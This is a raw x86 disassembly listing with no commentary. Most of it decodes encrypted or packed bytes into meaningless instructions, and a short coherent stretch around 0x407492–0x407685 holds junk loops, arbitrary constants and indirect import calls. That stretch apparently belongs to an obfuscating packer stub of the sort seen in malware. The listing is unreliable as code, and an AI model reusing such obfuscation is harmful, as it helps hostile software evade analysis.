  40717b:	adc    bh,ch
  40717d:	out    dx,eax
  40717e:	jecxz  0x407133
  407180:	fbstp  TBYTE PTR [esi]
  407182:	hlt    
  407183:	sbb    eax,0x2fa7e50c
  407188:	mov    ch,0x22
  40718a:	shl    BYTE PTR [eax-0x56],0x8e
  40718e:	xchg   DWORD PTR [ecx],esi
  407190:	mov    WORD PTR [edi-0x301fd6fb],fs
  407196:	test   ebp,ebx
  407198:	lds    ebx,FWORD PTR [ecx+0x73c5ac03]
  40719e:	cs cmc 
  4071a0:	lahf   
  4071a1:	push   ds
  4071a2:	push   edx
  4071a3:	frstor [eax-0x5705190b]
  4071a9:	and    DWORD PTR [ecx-0x79],edi
  4071ac:	mov    ecx,0xdd3ac3cf
  4071b1:	(bad)  
  4071b2:	fidiv  DWORD PTR [ebx+0x6d]
  4071b5:	xchg   ebp,eax
  4071b6:	add    al,0x1f
  4071b8:	xor    eax,0xa224dd07
  4071bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071be:	ins    BYTE PTR es:[edi],dx
  4071bf:	sbb    al,bh
  4071c1:	mov    eax,ds:0x3e78b2a4
  4071c6:	pop    edx
  4071c7:	stc    
  4071c8:	test   al,0x95
  4071ca:	mov    dl,0x4
  4071cc:	and    al,0xc7
  4071ce:	xchg   edx,eax
  4071cf:	out    0xf5,eax
  4071d1:	xor    DWORD PTR [edi+0x6a],ebx
  4071d4:	adc    BYTE PTR ds:0x657b466a,bl
  4071da:	fbld   TBYTE PTR [ebx-0x32df374f]
  4071e0:	mov    al,ds:0xe0b85d90
  4071e5:	cld    
  4071e6:	xchg   BYTE PTR [edi],bh
  4071e8:	xchg   ebx,ebx
  4071ea:	and    esp,eax
  4071ec:	xchg   bl,ch
  4071ee:	pushf  
  4071ef:	xor    ecx,eax
  4071f1:	test   DWORD PTR [ecx+0x1e8f9ee4],edx
  4071f7:	jecxz  0x407202
  4071f9:	fld    TBYTE PTR [esi]
  4071fb:	(bad)  
  4071fc:	sub    eax,0x9ceda113
  407201:	sar    dh,1
  407203:	neg    BYTE PTR [esi+0x77]
  407206:	mov    ?,WORD PTR [edx+0x21]
  407209:	and    edx,DWORD PTR [ebx-0x62]
  40720c:	sbb    al,BYTE PTR [esp+eax*1]
  40720f:	or     ecx,ebx
  407211:	jbe    0x407218
  407213:	(bad)  
  407214:	pop    ecx
  407215:	adc    BYTE PTR [eax-0x48],ah
  407218:	mov    esi,0x1c1b6159
  40721d:	cdq    
  40721e:	int3   
  40721f:	adc    al,0x81
  407221:	cdq    
  407222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407223:	test   edx,ebp
  407225:	cmp    al,0xe2
  407227:	outs   dx,DWORD PTR ds:[esi]
  407228:	call   0xc1e5fb15
  40722d:	push   esp
  40722e:	outs   dx,BYTE PTR ds:[esi]
  40722f:	xor    ah,BYTE PTR [ebx]
  407231:	cs jbe 0x4071e9
  407234:	or     bh,BYTE PTR [ebx]
  407236:	mov    al,ds:0xeed98d91
  40723b:	into   
  40723c:	push   0x5d
  40723e:	mov    al,0x43
  407240:	(bad)  
  407241:	(bad)  
  407242:	push   esp
  407243:	adc    eax,0x62af09de
  407248:	das    
  407249:	mov    dl,0x81
  40724b:	jns    0x40722a
  40724d:	mov    eax,ds:0xa409e940
  407252:	out    dx,al
  407253:	mov    ds:0x6acf8708,eax
  407258:	sub    eax,0xe31d8f5b
  40725d:	cdq    
  40725e:	push   0x5a
  407260:	fsubr  st(1),st
  407262:	adc    eax,0x379e33ab
  407267:	xchg   esi,eax
  407268:	lock push ebx
  40726a:	(bad)  [edi-0x5ec9528]
  407270:	stos   BYTE PTR es:[edi],al
  407271:	push   ecx
  407272:	xor    DWORD PTR [ecx],esp
  407274:	mov    ecx,DWORD PTR [eax+0x38]
  407277:	sub    BYTE PTR [edi],0x3a
  40727a:	pushf  
  40727b:	ficom  WORD PTR [esi]
  40727d:	stos   BYTE PTR es:[edi],al
  40727e:	lods   eax,DWORD PTR ds:[esi]
  40727f:	push   eax
  407280:	(bad)  
  407282:	sbb    esi,DWORD PTR [ecx+0x77]
  407285:	jo     0x40722e
  407287:	jp     0x40729c
  407289:	sbb    DWORD PTR [edx+eax*1+0x7876a509],edi
  407290:	sbb    eax,0xd2a2266a
  407295:	adc    bl,cl
  407297:	pop    eax
  407298:	icebp  
  407299:	retf   0xd4f7
  40729c:	jle    0x407244
  40729e:	sbb    edi,0x9ae08532
  4072a4:	pop    ebp
  4072a5:	push   ds
  4072a6:	mov    esi,0x57c874a7
  4072ab:	pop    eax
  4072ac:	sbb    ebx,DWORD PTR [ebx]
  4072ae:	mov    bh,0xfe
  4072b0:	imul   esi,DWORD PTR [esi],0x9807bbd2
  4072b6:	ss mov cl,0x1a
  4072b9:	inc    esp
  4072ba:	add    BYTE PTR [esi-0x20],0xe9
  4072be:	jne    0x4072f0
  4072c0:	adc    BYTE PTR [ecx+0xf],cl
  4072c3:	div    ebp
  4072c5:	dec    edi
  4072c6:	cmp    al,BYTE PTR [ebx]
  4072c8:	jbe    0x4072d9
  4072ca:	mov    cl,0x64
  4072cc:	adc    BYTE PTR [edi+ebp*1],dl
  4072cf:	inc    eax
  4072d0:	imul   eax,edi,0x8d9b9e65
  4072d6:	(bad)  
  4072d7:	imul   ecx,DWORD PTR [ebx],0xe381d5e
  4072dd:	jp     0x4072e7
  4072df:	adc    BYTE PTR [edi],0x85
  4072e2:	arpl   WORD PTR [esi+0x7051ccd5],bx
  4072e8:	xlat   BYTE PTR ds:[ebx]
  4072e9:	test   BYTE PTR [ebx],ch
  4072eb:	loopne 0x407311
  4072ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072ee:	iret   
  4072ef:	inc    esp
  4072f0:	inc    edi
  4072f1:	dec    ebx
  4072f2:	inc    eax
  4072f3:	pop    es
  4072f4:	je     0x407278
  4072f6:	push   ds
  4072f7:	sbb    BYTE PTR cs:0xa8833fdf,ch
  4072fe:	dec    ebx
  4072ff:	int3   
  407300:	mov    DWORD PTR [ebp-0x42],ebx
  407303:	jmp    0xc7023045
  407308:	mov    edi,0x895304b7
  40730d:	xor    cl,bh
  40730f:	jmp    0x8af2:0xdcf4e3e7
  407316:	adc    eax,0xe19d4963
  40731b:	dec    ebx
  40731c:	xchg   ebp,eax
  40731d:	aas    
  40731e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40731f:	(bad)  
  407320:	rol    edx,cl
  407322:	fst    DWORD PTR [esp+eiz*2+0x4f822986]
  407329:	shr    DWORD PTR [ebx],cl
  40732b:	les    ecx,FWORD PTR [eax]
  40732d:	cs push edx
  40732f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407330:	cld    
  407331:	xchg   esp,eax
  407332:	push   esp
  407333:	or     esi,DWORD PTR [eax-0xc9c0cb4]
  407339:	ins    BYTE PTR es:[edi],dx
  40733a:	push   edx
  40733b:	push   ebp
  40733c:	out    0xaf,eax
  40733e:	popf   
  40733f:	popf   
  407340:	mov    dh,0xda
  407342:	or     dl,BYTE PTR [esi+0x78]
  407345:	imul   edi,DWORD PTR [esi-0x45],0xbfc6b938
  40734c:	daa    
  40734d:	mov    ecx,DWORD PTR [esi+0x1e756381]
  407353:	outs   dx,DWORD PTR ds:[esi]
  407354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407355:	jle    0x407383
  407357:	retf   0x81d2
  40735a:	call   0xef1e7c0d
  40735f:	push   eax
  407360:	enter  0x4f01,0x81
  407364:	jo     0x407372
  407366:	cmp    dl,BYTE PTR ds:0x6b07981c
  40736c:	fdiv   QWORD PTR [ecx]
  40736e:	push   ebx
  40736f:	pushf  
  407370:	jbe    0x4073ca
  407372:	pop    esi
  407373:	enter  0xb4a6,0xde
  407377:	jno    0x4073d1
  407379:	mov    al,ds:0xa0c919e2
  40737e:	jae    0x4073aa
  407380:	xchg   BYTE PTR [ecx+ecx*4],al
  407383:	jmp    0xb4de365
  407388:	xchg   BYTE PTR [edi+0x29],ch
  40738b:	xor    bh,ah
  40738d:	push   ebx
  40738e:	mov    ds:0x3d1dfc53,al
  407393:	cli    
  407394:	pop    esi
  407395:	stos   BYTE PTR es:[edi],al
  407396:	sbb    eax,0xf7cba00b
  40739b:	pop    ds
  40739c:	call   0x967f7983
  4073a1:	ja     0x407414
  4073a3:	stos   BYTE PTR es:[edi],al
  4073a4:	inc    esp
  4073a5:	pop    edi
  4073a6:	arpl   WORD PTR [edx+0x41],bx
  4073a9:	inc    esi
  4073aa:	dec    eax
  4073ab:	aam    0xbe
  4073ad:	test   edx,esi
  4073af:	(bad)  
  4073b0:	pop    esi
  4073b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b2:	ds push ss
  4073b4:	xchg   ebx,eax
  4073b5:	dec    esi
  4073b6:	cmp    DWORD PTR [edx-0x16],ecx
  4073b9:	mov    ds:0xc8c3d94,al
  4073be:	inc    ebp
  4073bf:	dec    ecx
  4073c0:	jle    0x407366
  4073c2:	out    dx,eax
  4073c3:	xor    al,0xb2
  4073c5:	adc    DWORD PTR [bp+di+0x78],edi
  4073c9:	jmp    0x407449
  4073cb:	lds    edi,FWORD PTR [ebp+0x1861388b]
  4073d1:	retf   0x2380
  4073d4:	(bad)  
  4073d5:	jmp    0x4fea7602
  4073da:	sbb    eax,DWORD PTR [esi+0x54]
  4073dd:	test   eax,0x32ff714a
  4073e2:	jge    0x4073c2
  4073e4:	sti    
  4073e5:	jns    0x407398
  4073e7:	ret    
  4073e8:	frstor [ebp-0x6604394f]
  4073ee:	outs   dx,BYTE PTR ds:[esi]
  4073ef:	jb     0x4073dc
  4073f1:	and    ch,BYTE PTR [ecx+0x4255f3a2]
  4073f7:	cmp    dh,BYTE PTR [esi]
  4073f9:	and    DWORD PTR [ebp+0x42724abd],edx
  4073ff:	push   edx
  407400:	jecxz  0x40745f
  407402:	dec    edi
  407403:	jne    0x40746f
  407405:	ret    
  407406:	pop    edi
  407407:	mov    ebp,0x9268c6ae
  40740c:	test   DWORD PTR [ecx+edx*1+0x60],edi
  407410:	jmp    0x40745b
  407412:	mov    esi,0xf990029a
  407417:	repnz push 0x3a
  40741a:	dec    edx
  40741b:	call   0xcaf3:0xb6f172bd
  407422:	jb     0x407459
  407424:	je     0x4073bf
  407426:	ror    BYTE PTR [ecx-0x30],1
  407429:	fsub   DWORD PTR [ecx+0x4f]
  40742c:	(bad)  
  40742d:	fwait
  40742e:	dec    esi
  40742f:	inc    esi
  407430:	fwait
  407431:	dec    eax
  407432:	aaa    
  407433:	xor    esp,DWORD PTR [edx]
  407435:	add    BYTE PTR [edi+0x4d],0xa0
  407439:	and    DWORD PTR [esi-0x62],esi
  40743c:	cld    
  40743d:	ret    0xf524
  407440:	mov    ah,bh
  407442:	inc    esp
  407443:	cmp    ecx,DWORD PTR [ebx]
  407445:	adc    ebp,DWORD PTR [edx]
  407447:	ret    0x763f
  40744a:	pop    ebx
  40744b:	test   DWORD PTR [ebx+0x5782bcb6],0xf49f621f
  407455:	popf   
  407456:	add    dh,ch
  407458:	pop    ebx
  407459:	js     0x4074bc
  40745b:	and    edx,DWORD PTR [edi-0x4a09717a]
  407461:	xchg   esi,eax
  407462:	lds    edx,FWORD PTR [eax]
  407464:	hlt    
  407465:	int3   
  407466:	cmp    eax,0xbc2ee840
  40746b:	test   dl,cl
  40746d:	in     al,dx
  40746e:	stos   BYTE PTR es:[edi],al
  40746f:	mov    ch,0x35
  407471:	in     al,0xa
  407473:	adc    bl,BYTE PTR [edx]
  407475:	bound  esp,QWORD PTR [edi-0x42572e77]
  40747b:	pop    es
  40747c:	xchg   DWORD PTR [edi-0x80],ebp
  40747f:	push   eax
  407480:	addr16 cld 
  407482:	sub    esp,DWORD PTR [edi]
  407484:	inc    edi
  407485:	dec    edx
  407486:	out    dx,al
  407487:	dec    edx
  407488:	ds mov eax,es
  40748b:	add    esi,DWORD PTR [edx+0x114a46d3]
  407491:	push   eax
  407492:	and    DWORD PTR ds:0x42b01c,0x1f92
  40749c:	call   DWORD PTR ds:0x42ed63
  4074a2:	not    DWORD PTR ds:0x429020
  4074a8:	push   0x21
  4074aa:	push   0x434
  4074af:	xor    DWORD PTR ds:0x42d000,0x4953
  4074b9:	push   0x98678765
  4074be:	and    DWORD PTR ds:0x42a018,0xec
  4074c8:	call   DWORD PTR ds:0x42ed47
  4074ce:	sbb    eax,0x149b
  4074d3:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  4074da:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  4074e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4074e4:	mov    ebx,0x7510899
  4074e9:	inc    eax
  4074ea:	xor    ecx,ebx
  4074ec:	mov    DWORD PTR ds:0x429020,0x12
  4074f6:	cmp    DWORD PTR ds:0x429020,0x0
  4074fd:	je     0x407554
  407503:	cmp    DWORD PTR ds:0x429020,0x7
  40750a:	jne    0x407522
  407510:	push   0x42e000
  407515:	push   0x0
  407517:	push   0x18ee
  40751c:	call   DWORD PTR ds:0x42ed8f
  407522:	cmp    DWORD PTR ds:0x429020,0x8
  407529:	jne    0x40753a
  40752f:	mov    eax,ds:0x429020
  407534:	dec    eax
  407535:	mov    ds:0x429020,eax
  40753a:	mov    eax,ds:0x429020
  40753f:	dec    eax
  407540:	mov    ds:0x429020,eax
  407545:	jmp    0x4074f6
  40754a:	sbb    DWORD PTR ds:0x42d01c,0x3713
  407554:	mov    eax,0x3272e0
  407559:	add    ecx,eax
  40755b:	mov    DWORD PTR [ebp-0x24],ecx
  40755e:	sbb    ecx,DWORD PTR ds:0x429020
  407564:	mov    ecx,DWORD PTR [ebp+0x14]
  407567:	test   ecx,ecx
  407569:	mov    DWORD PTR ds:0x429014,0x4f5c
  407573:	je     0x407598
  407579:	movzx  ecx,WORD PTR ds:0x42b004
  407580:	sub    DWORD PTR ds:0x42d008,ecx
  407586:	mov    ecx,DWORD PTR [ebp+0x14]
  407589:	mov    DWORD PTR ds:0x42a000,0x186b
  407593:	mov    ecx,DWORD PTR [ecx]
  407595:	mov    DWORD PTR [ebp-0x24],ecx
  407598:	mov    ecx,0x7665
  40759d:	xor    DWORD PTR ds:0x429000,ecx
  4075a3:	imul   edx,eax
  4075a6:	mov    esi,DWORD PTR ds:0x424bcd
  4075ac:	mov    edi,DWORD PTR ds:0x424be1
  4075b2:	sub    esi,edi
  4075b4:	and    esi,DWORD PTR [esi+edi*1]
  4075b7:	mov    esi,0x76532
  4075bc:	add    edx,ecx
  4075be:	xchg   esi,ecx
  4075c0:	and    DWORD PTR ds:0x429008,0x0
  4075ca:	mov    esi,DWORD PTR ds:0x429008
  4075d0:	inc    esi
  4075d1:	mov    DWORD PTR ds:0x429008,esi
  4075d7:	cmp    DWORD PTR ds:0x429008,0x7
  4075de:	jne    0x4075ef
  4075e4:	push   0x24d9
  4075e9:	call   DWORD PTR ds:0x42ed4f
  4075ef:	cmp    DWORD PTR ds:0x429008,0x6
  4075f6:	jne    0x407609
  4075fc:	mov    esi,DWORD PTR ds:0x429008
  407602:	inc    esi
  407603:	mov    DWORD PTR ds:0x429008,esi
  407609:	cmp    DWORD PTR ds:0x429008,0x10
  407610:	jb     0x4075ca
  407616:	mov    edi,0x54354
  40761b:	sub    edx,edi
  40761d:	mov    ecx,DWORD PTR [ebp-0x4]
  407620:	sub    DWORD PTR ds:0x42901c,edx
  407626:	xor    ecx,ebx
  407628:	and    DWORD PTR ds:0x429010,0x0
  407632:	mov    esi,DWORD PTR ds:0x429010
  407638:	inc    esi
  407639:	mov    DWORD PTR ds:0x429010,esi
  40763f:	cmp    DWORD PTR ds:0x429010,0x4
  407646:	jne    0x40765e
  40764c:	push   0x42e000
  407651:	push   0x0
  407653:	push   0x1
  407655:	push   DWORD PTR [ebp-0x14]
  407658:	call   DWORD PTR ds:0x42ed53
  40765e:	cmp    DWORD PTR ds:0x429010,0x3
  407665:	jne    0x407678
  40766b:	mov    esi,DWORD PTR ds:0x429010
  407671:	inc    esi
  407672:	mov    DWORD PTR ds:0x429010,esi
  407678:	cmp    DWORD PTR ds:0x429010,0x13
  40767f:	jb     0x407632
  407685:	jmp    0x409a32
  40768a:	mov    ds:0x277127e6,eax
  40768f:	jnp    0x407704
  407691:	mov    ah,0xde
  407693:	sbb    DWORD PTR [ebp+0x47],esp
  407696:	frstor [ebx]
  407698:	or     esp,DWORD PTR [edi-0x44]
  40769b:	cmp    al,0x7a
  40769d:	jp     0x407689
  40769f:	pop    edi
  4076a0:	jp     0x40771c
  4076a2:	jns    0x4076fd
  4076a4:	inc    edx
  4076a5:	test   eax,0x1275e2cd
  4076aa:	mov    eax,0x6b25d018
  4076af:	int3   
  4076b0:	mov    eax,ds:0xe953817b
  4076b5:	pushf  
  4076b6:	jle    0x407640
  4076b8:	mov    bl,0x1c
  4076ba:	or     al,0xf0
  4076bc:	push   edx
  4076bd:	div    BYTE PTR [edi+0x5e]
  4076c0:	mov    edi,0xebe8a952
  4076c5:	push   es
  4076c6:	jnp    0x407739
  4076c8:	inc    esp
  4076c9:	das    
  4076ca:	and    dl,BYTE PTR [esi+eax*4-0x1bf8a538]
  4076d1:	dec    ebp
  4076d2:	das    
  4076d3:	fs mov cl,0xc1
  4076d6:	xor    ch,cl
  4076d8:	addr16 ror cl,0x5b
  4076dc:	test   BYTE PTR [ebx+0x82f0998],bh
  4076e2:	push   0x41
  4076e4:	mov    al,ds:0xe5ecaa41
  4076e9:	(bad)  
  4076ea:	iret   
  4076eb:	scas   eax,DWORD PTR es:[edi]
  4076ec:	hlt    
  4076ed:	add    edx,eax
  4076ef:	cld    
  4076f0:	push   ebx
  4076f1:	(bad)  
  4076f2:	mov    esi,0x2956fda8
  4076f7:	jge    0x40769b
  4076f9:	cwde   
  4076fa:	adc    esi,edx
  4076fc:	dec    edi
  4076fd:	repnz inc esi
  4076ff:	adc    BYTE PTR [edx],dl
  407701:	ins    DWORD PTR es:[edi],dx
  407702:	inc    ebp
  407703:	ja     0x40771b
  407705:	xor    esp,DWORD PTR [ecx]
  407707:	icebp  
  407708:	sbb    DWORD PTR ds:0xff9e6e00,ebp
  40770e:	ret    0xeb3d
  407711:	out    dx,al
  407712:	push   0x6c
  407714:	(bad)  
  407715:	adc    DWORD PTR [ecx+0x492e399b],ebp
  40771b:	pop    eax
  40771c:	push   es
  40771d:	mov    cl,0xda
  40771f:	frstor [eax]
  407721:	test   al,0x7
  407723:	loope  0x407726
  407725:	pop    ecx
  407726:	ins    BYTE PTR es:[edi],dx
  407727:	pop    edx
  407728:	pushf  
  407729:	mov    DWORD PTR [esi+edx*2-0x14],ecx
  40772d:	lods   al,BYTE PTR ds:[esi]
  40772e:	hlt    
  40772f:	arpl   WORD PTR [ebx-0x79],di
  407732:	stos   DWORD PTR es:[edi],eax
  407733:	mov    al,ds:0x505cbcb5
  407738:	and    al,BYTE PTR ds:0xf0a84a92
  40773e:	adc    BYTE PTR [edi-0x2cf400ac],0xc5
  407745:	mov    dl,0xe8
  407747:	(bad)  
  407748:	xchg   BYTE PTR [ebx+0x55e7cc31],bl
  40774e:	ins    DWORD PTR es:[edi],dx
  40774f:	inc    esp
  407750:	ret    
  407751:	in     eax,0x9
  407753:	retf   
  407754:	mov    ebx,0x5165ecef
  407759:	jb     0x4077d2
  40775b:	call   0x3bd5c146
  407760:	ffreep st(5)
  407762:	test   DWORD PTR [eax+0x7f],edx
  407765:	jg     0x4076e7
  407767:	mov    ds:0x2aebf5c8,al
  40776c:	adc    DWORD PTR ds:0x6569bb24,0x2c3da6ba
  407776:	jo     0x40778d
  407778:	mov    al,ds:0x7925eacb
  40777d:	dec    ebp
  40777e:	cmp    DWORD PTR [ecx],ebx
  407780:	loopne 0x407758
  407782:	mov    cl,0xea
  407784:	push   0xb9bf3f35
  407789:	dec    esi
  40778a:	adc    eax,0x5306c598
  40778f:	sahf   
  407790:	inc    eax
  407791:	pop    edx
  407792:	loope  0x4077df
  407794:	mov    ah,0x8
  407796:	pop    eax
  407797:	in     al,dx
  407798:	and    esp,ecx
  40779a:	adc    ebx,esp
  40779c:	mov    eax,ds:0x90712f5e
  4077a1:	dec    ebp
  4077a2:	fild   QWORD PTR [edi]
  4077a4:	mov    cs,WORD PTR ds:0xc727c185
  4077aa:	repnz adc dh,BYTE PTR [edx-0x61f156b8]
  4077b1:	call   0x860fc309
  4077b6:	enter  0x7710,0x48
  4077ba:	mov    ds:0xcd8c18e5,eax
  4077bf:	mov    BYTE PTR [ebx+0x30399ce],dh
  4077c5:	push   cs
  4077c6:	and    esp,DWORD PTR [edi]
  4077c8:	adc    cl,BYTE PTR [ecx-0x55]
  4077cb:	shl    DWORD PTR [esi+0x1],cl
  4077ce:	nop
  4077cf:	mov    bh,bh
  4077d1:	(bad)  
  4077d2:	aam    0x16
  4077d4:	pcmpgtb mm4,QWORD PTR ds:0xd6c4f8ec
  4077db:	fstp   QWORD PTR [esi]
  4077dd:	mov    DWORD PTR [edx-0x7e],ebx
  4077e0:	ds scas al,BYTE PTR es:[edi]
  4077e2:	sub    al,0x24
  4077e4:	add    ch,BYTE PTR [ebx]
  4077e6:	into   
  4077e7:	fs inc eax
  4077e9:	pop    es
  4077ea:	mov    BYTE PTR [ebx-0x73],bl
  4077ed:	je     0x407837
  4077ef:	and    eax,DWORD PTR [edi-0x264595d0]
  4077f5:	test   al,0x65
  4077f7:	enter  0xc71b,0x19
  4077fb:	addr16 push edx
  4077fd:	pop    ebx
  4077fe:	mov    ds:0x649767ff,eax
  407803:	test   eax,0x10c206a8
  407808:	das    
  407809:	mov    ebp,0x62f225cb
  40780e:	jnp    0x4077d2
  407810:	in     al,dx
  407811:	push   esi
  407812:	sar    bl,1
  407814:	dec    esi
  407815:	ins    BYTE PTR es:[edi],dx
  407816:	jnp    0x4077ec
  407818:	(bad)  
  407819:	jnp    0x407814
  40781b:	mov    cl,0x17
  40781d:	adc    ecx,DWORD PTR [ebx+0x35]
  407820:	imul   edi,ecx,0xd7275014
  407826:	je     0x407802
  407828:	push   0xdbb0be98
  40782d:	xor    eax,0x92e20fa0
  407833:	inc    ecx
  407834:	inc    edx
  407835:	xchg   ecx,eax
  407836:	pushf  
  407837:	jg     0x4077dc
  407839:	ss fwait
  40783b:	loope  0x407894
  40783d:	fidiv  DWORD PTR [edi+0x494bd0c9]
  407843:	inc    edi
  407844:	add    al,0x3f
  407846:	js     0x4077dd
  407848:	cmp    eax,0xdd443b2f
  40784d:	addr16 push ecx
  40784f:	aas    
  407850:	mov    DWORD PTR [esi+0x67d1daf7],ecx
  407856:	dec    eax
  407857:	xchg   BYTE PTR [ebp+0x8b83413],cl
  40785d:	jbe    0x407837
  40785f:	and    dl,BYTE PTR [ebx]
  407861:	sub    eax,0x3ccc3d10
  407866:	dec    eax
  407867:	xor    BYTE PTR [ebx],cl
  407869:	mov    ds:0xaa9f8417,al
  40786e:	arpl   WORD PTR [eax-0x3b],ax
  407871:	xor    al,0xd6
  407874:	dec    edi
  407875:	sub    cl,BYTE PTR [ebp+0x57]
  407878:	jg     0x4078b8
  40787a:	pop    es
  40787b:	sahf   
  40787c:	jns    0x40788b
  40787e:	jmp    0x6d46b4b8
  407883:	push   esp
  407884:	pop    ecx
  407885:	gs sbb al,0x81
  407888:	or     eax,0x3b5f3e15
  40788d:	dec    ebx
  40788e:	cld    
  40788f:	jns    0x40782b
  407891:	mov    ch,0x51
  407893:	xchg   esp,eax
  407894:	sub    esi,DWORD PTR [ecx-0x7dd6d33f]
  40789a:	div    BYTE PTR [ebp+0x57743ee7]
  4078a0:	sbb    esp,esp
  4078a2:	jae    0x40782a
  4078a4:	jno    0x4078c9
  4078a6:	fnstsw WORD PTR ds:0xe62a638b
  4078ac:	pop    edi
  4078ad:	aam    0xf4
  4078af:	fimul  WORD PTR [esi-0x1f0ecf26]
  4078b5:	imul   DWORD PTR [edx+0x43]
  4078b8:	ret    0xfcbc
  4078bb:	test   al,0xff
  4078bd:	stc    
  4078be:	mov    eax,ds:0xb99c946e
  4078c3:	cs inc ebx
  4078c5:	mov    dl,0x1a
  4078c7:	add    ah,BYTE PTR [ebp+0x140a3807]
  4078cd:	pop    esi
  4078ce:	out    0x8e,eax
  4078d0:	jmp    0x9591b158
  4078d5:	dec    edx
  4078d6:	out    dx,al
  4078d7:	mov    cl,0xc1
  4078d9:	push   ecx
  4078da:	sbb    BYTE PTR ds:[edx+0xa],ah
  4078de:	and    DWORD PTR [ebp+0x3d21d45a],ebp
  4078e4:	jle    0x40786c
  4078e6:	pop    ss
  4078e7:	mov    BYTE PTR [edi-0x40],ah
  4078ea:	sub    bl,bl
  4078ec:	fwait
  4078ed:	sbb    al,0xef
  4078ef:	fbld   TBYTE PTR [ebx]
  4078f1:	cs pop edi
  4078f3:	pop    esi
  4078f4:	fmul   DWORD PTR [esi-0x114612cc]
  4078fa:	lds    esp,FWORD PTR [edi+esi*2-0x14]
  4078fe:	xchg   esp,eax
  4078ff:	jmp    0xf730bec8
  407904:	xchg   BYTE PTR [eax],ch
  407906:	les    ebp,FWORD PTR [ebx]
  407908:	jge    0x40796c
  40790a:	cmp    al,0xdd
  40790c:	clc    
  40790d:	or     BYTE PTR [edi],0x6
  407910:	pop    edi
  407911:	addr16 std 
  407913:	lock dec ebp
  407915:	jbe    0x407949
  407917:	sub    edi,ecx
  407919:	das    
  40791a:	in     al,0x3
  40791c:	mov    dl,0xa3
  40791e:	xchg   esi,eax
  40791f:	xchg   esi,eax
  407920:	jl     0x4078ac
  407922:	jo     0x4079a1
  407924:	(bad)  
  407925:	inc    ecx
  407926:	fnsave [edi-0x5d]
  407929:	lock call 0xffd40db3
  40792f:	lods   al,BYTE PTR ds:[esi]
  407930:	outs   dx,BYTE PTR ds:[esi]
  407931:	fimul  DWORD PTR ds:0x172378a9
  407937:	je     0x40795e
  407939:	dec    edi
  40793a:	fld    QWORD PTR [esi]
  40793c:	pop    es
  40793d:	jae    0x4079bb
  40793f:	shl    DWORD PTR [esi-0x60],0x4e
  407943:	sub    bl,BYTE PTR [ebx]
  407945:	fbld   TBYTE PTR [edx+0x27]
  407948:	pop    ecx
  407949:	clc    
  40794a:	(bad)  
  40794b:	(bad)  
  40794d:	xchg   edx,eax
  40794e:	fs jo  0x407923
  407951:	xchg   esi,eax
  407952:	lea    eax,[ecx+0x62]
  407955:	stos   DWORD PTR es:[edi],eax
  407956:	clc    
  407957:	or     eax,0x389f0eeb
  40795c:	pushf  
  40795d:	dec    esp
  40795e:	addr16 jne 0x4079b5
  407961:	retf   0x8977
  407964:	pop    ebp
  407965:	fwait
  407966:	and    BYTE PTR [eax-0x559655e8],cl
  40796c:	je     0x40792e
  40796e:	mov    eax,ds:0x8ec883e6
  407973:	fwait
  407974:	add    DWORD PTR [ebx+0x7d245d04],ebx
  40797a:	xchg   DWORD PTR [esi+0x35],ebx
  40797d:	push   eax
  40797e:	pop    ds
  40797f:	frstor [ecx]
  407981:	addr16 in eax,dx
  407983:	call   0xb34beb03
  407988:	or     eax,DWORD PTR [esi-0x4e78220f]
  40798e:	loop   0x4079d0
  407990:	popf   
  407991:	push   edx
  407992:	or     BYTE PTR [eax-0x4d0fe250],dh
  407998:	shr    bl,0xaf
  40799b:	mov    cl,0xed
  40799d:	bound  esi,QWORD PTR [ecx-0xdaa2892]
  4079a3:	adc    edx,edx
  4079a5:	mov    ebp,DWORD PTR [edx-0x54]
  4079a8:	xchg   ah,dh
  4079aa:	mov    cl,0x67
  4079ac:	fadd   QWORD PTR [edi-0x48b89214]
  4079b2:	xchg   esp,eax
  4079b3:	sbb    al,0x7
  4079b5:	or     eax,0xdef05489
  4079ba:	test   al,0x77
  4079bc:	mov    WORD PTR [edi+ebx*2-0x516bd48b],ss
  4079c3:	clc    
  4079c4:	mov    ?,WORD PTR [eax+0x42]
  4079c7:	mov    edx,0x96f6baf2
  4079cc:	adc    BYTE PTR ds:0xbc7cdae5,ah
  4079d2:	sbb    eax,0x793007bb
  4079d7:	add    BYTE PTR [esi-0x776ba539],dh
  4079dd:	aaa    
  4079de:	test   bh,bl
  4079e0:	lahf   
  4079e1:	lahf   
  4079e2:	pusha  
  4079e3:	dec    ebx
  4079e4:	ret    
  4079e5:	test   BYTE PTR [ebp-0x1393bd49],0x51
  4079ec:	repz or al,0x4f
  4079ef:	ret    
  4079f0:	pop    es
  4079f1:	cs mov cl,0xb4
  4079f4:	sbb    BYTE PTR [edx],dh
  4079f6:	mov    ch,0x1d
  4079f8:	aas    
  4079f9:	sbb    cl,BYTE PTR [esi+eiz*8]
  4079fc:	dec    sp
  4079fe:	repz fdivr QWORD PTR ds:0x8ef43bd7
  407a05:	adc    ecx,esp
  407a07:	mov    al,0xa1
  407a09:	fs out 0xbf,al
  407a0c:	ret    0x85d2
  407a0f:	sti    
  407a10:	inc    ecx
  407a11:	aad    0x3b
  407a13:	mov    eax,DWORD PTR [ebx+0x2c01bef1]
  407a19:	cdq    
  407a1a:	repnz xchg edi,esi
  407a1d:	js     0x407a89
  407a1f:	ror    ebp,cl
  407a21:	mov    bh,0x7b
  407a23:	mov    ebx,0x3d68fea0
  407a28:	xchg   ebx,eax
  407a29:	or     ah,BYTE PTR [ecx+0x2f]
  407a2c:	lds    ebx,FWORD PTR [ebx+eax*2]
  407a2f:	loope  0x407a62
  407a31:	push   ss
  407a32:	scas   eax,DWORD PTR es:[edi]
  407a33:	and    eax,0x152ec8d
  407a38:	xchg   ebx,eax
  407a39:	dec    ebx
  407a3a:	sub    DWORD PTR [ecx-0x8cdcfb3],ecx
  407a40:	jbe    0x407abb
  407a42:	fidiv  DWORD PTR [esi-0x70080555]
  407a48:	mov    ebx,0xb444483e
  407a4d:	in     eax,0x65
